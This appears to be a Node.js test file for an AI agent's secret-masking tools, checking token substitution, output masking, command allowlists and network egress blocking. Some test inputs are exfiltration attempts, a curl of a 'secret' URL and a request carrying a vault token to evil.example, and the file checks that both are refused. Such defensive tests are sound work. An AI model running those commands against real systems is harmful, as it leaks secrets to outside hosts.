import assert from "node:assert/strict";
import test from "node:test";
import { makeCtx, makeState } from "./helpers.js";
import { registerSecureTools } from "../dist/tools.js";

const signal = new AbortController().signal;

function fakeShell() {
  const calls = [];
  return {
    calls,
    resolve(spec) {
      calls.push(spec);
      return spec;
    },
    async execute(spec) {
      return {
        async result() {
          return {
            exitCode: 0,
            signal: null,
            timedOut: false,
            stdout: { text: `out ${spec.command}` },
            stderr: { text: "" },
          };
        },
      };
    },
  };
}

test("secure_run resolves a token in the command and masks output", async () => {
  const shell = fakeShell();
  const ctx = makeCtx({ shell });
  const { state, vault } = await makeState();
  registerSecureTools(ctx, state);
  const token = await vault.store("S3cret99", "SECRET");
  const tool = ctx.registeredTools.get("secure_run");
  assert.ok(tool);

  const result = await tool.execute({ command: `echo password=${token}` }, { signal });
  assert.match(shell.calls[0].command, /password=S3cret99/);
  assert.match(result.stdout, /\{\{SECRET_[a-z2-7]{6}\}\}/);
  assert.equal(result.exitCode, 0);
});

test("secure_write resolves a token in content and does not return it", async () => {
  const writes = [];
  const fs = {
    async resolve(path) {
      return { path };
    },
    async writeText(target, content) {
      writes.push({ target, content });
      return {};
    },
  };
  const ctx = makeCtx({ fs });
  const { state, vault } = await makeState();
  registerSecureTools(ctx, state);
  const token = await vault.store("13800138000", "PHONE");
  const tool = ctx.registeredTools.get("secure_write");
  assert.ok(tool);

  const result = await tool.execute({ path: "out.txt", content: `phone=${token}\n` }, { signal });
  assert.equal(writes[0].content, "phone=13800138000\n");
  assert.equal(result.path, "out.txt");
  assert.equal(result.bytes, Buffer.byteLength("phone=13800138000\n"));
  assert.ok(!JSON.stringify(result).includes("13800138000"));
});

test("secure_read masks file content and secure_edit resolves old/new text", async () => {
  const reads = [];
  const edits = [];
  const fs = {
    async resolve(path) {
      return { path };
    },
    async readText() {
      return "phone=13800138000\n";
    },
    async editText(target, request) {
      edits.push({ target, request });
      return { before: "", after: "" };
    },
  };
  const ctx = makeCtx({ fs });
  const { state, vault } = await makeState();
  registerSecureTools(ctx, state);
  const read = ctx.registeredTools.get("secure_read");
  const edit = ctx.registeredTools.get("secure_edit");
  assert.ok(read);
  assert.ok(edit);

  const readResult = await read.execute({ path: "notes.txt" }, { signal });
  assert.match(readResult.content, /\{\{PHONE_[a-z2-7]{6}\}\}/);
  assert.ok(!readResult.content.includes("13800138000"));

  const token = await vault.store("13800138000", "PHONE");
  const editResult = await edit.execute(
    { path: "notes.txt", old_string: `phone=${token}`, new_string: `phone=${token}\n` },
    { signal },
  );
  assert.equal(edits[0].request.oldString, "phone=13800138000");
  assert.equal(edits[0].request.newString, "phone=13800138000\n");
  assert.equal(editResult.path, "notes.txt");
});

test("secure_run denies network clients and enforces allowedCommands", async () => {
  const shell = fakeShell();
  const ctx = makeCtx({ shell });
  const { state } = await makeState();
  registerSecureTools(ctx, state);
  const tool = ctx.registeredTools.get("secure_run");
  assert.ok(tool);

  const network = await tool.execute({ command: "curl https://example.com/secret" }, { signal });
  assert.match(network.error, /network egress is disabled/);
  assert.equal(shell.calls.length, 0);

  const allowCtx = makeCtx({ shell: fakeShell() });
  const allowed = await makeState({ secureTools: { run: { allowedCommands: ["printf"], denyNetwork: true } } });
  registerSecureTools(allowCtx, allowed.state);
  const restricted = allowCtx.registeredTools.get("secure_run");
  const denied = await restricted.execute({ command: "echo hello" }, { signal });
  assert.match(denied.error, /allowedCommands/);
  const chained = await restricted.execute({ command: "printf x; echo y" }, { signal });
  assert.match(chained.error, /shell chaining/);
});

test("secure_run applies custom blockedPatterns", async () => {
  const shell = fakeShell();
  const ctx = makeCtx({ shell });
  const { state } = await makeState({ secureTools: { run: { denyNetwork: false, blockedPatterns: ["secret"] } } });
  registerSecureTools(ctx, state);
  const tool = ctx.registeredTools.get("secure_run");
  assert.ok(tool);
  const denied = await tool.execute({ command: "printf secret" }, { signal });
  assert.match(denied.error, /blocked pattern/);
  assert.equal(shell.calls.length, 0);
});

test("secure_request enforces the host allowlist before network access", async () => {
  const ctx = makeCtx();
  const { state, vault } = await makeState({ secureTools: { enabled: true, allowedHosts: ["api.example"] } });
  registerSecureTools(ctx, state);
  const tool = ctx.registeredTools.get("secure_request");
  assert.ok(tool);
  const token = await vault.store("secret", "SECRET");
  const result = await tool.execute({ url: `https://evil.example/${token}` }, { signal });
  assert.match(result.error, /not in secureTools.allowedHosts/);
});

test("secure tools are omitted when disabled", async () => {
  const ctx = makeCtx();
  const { state } = await makeState({ secureTools: { enabled: false } });
  const dispose = registerSecureTools(ctx, state);
  assert.equal(ctx.registeredTools.size, 0);
  dispose();
});
